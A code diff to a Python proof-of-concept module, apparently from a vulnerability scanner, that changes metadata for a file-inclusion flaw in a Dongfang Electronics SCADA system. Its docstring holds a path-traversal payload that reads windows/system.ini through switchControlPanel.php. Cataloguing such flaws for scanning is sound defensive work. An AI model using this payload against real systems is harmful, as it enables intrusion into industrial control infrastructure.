@@ -14,15 +14,15 @@ class Vuln(ABVuln):
         东方电子SCADA通用系统文件包含：
         /modules/tmr/server/switchControlPanel.php?func=../../../../../../../../../../../../windows/system.ini%00.htm
     ''' # 漏洞描述
-    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0131719
-    cnvd_id = '' # cnvd漏洞编号
-    cve_id = '' #cve编号
+    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0131719
+    cnvd_id = 'Unkonwn' # cnvd漏洞编号
+    cve_id = 'Unkonwn' #cve编号
     product = '东方电子SCADA'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    product_version = 'Unkonwn'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = 'dfe_scada_0006' # 平台 POC 编号，留空
+    poc_id = '2f8f3f3c-b784-4f98-a2ee-267ac558cf19'
     author = '国光'  # POC编写者
     create_date = '2018-05-25' # POC创建时间
 
@@ -44,7 +44,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 
 if __name__ == '__main__':
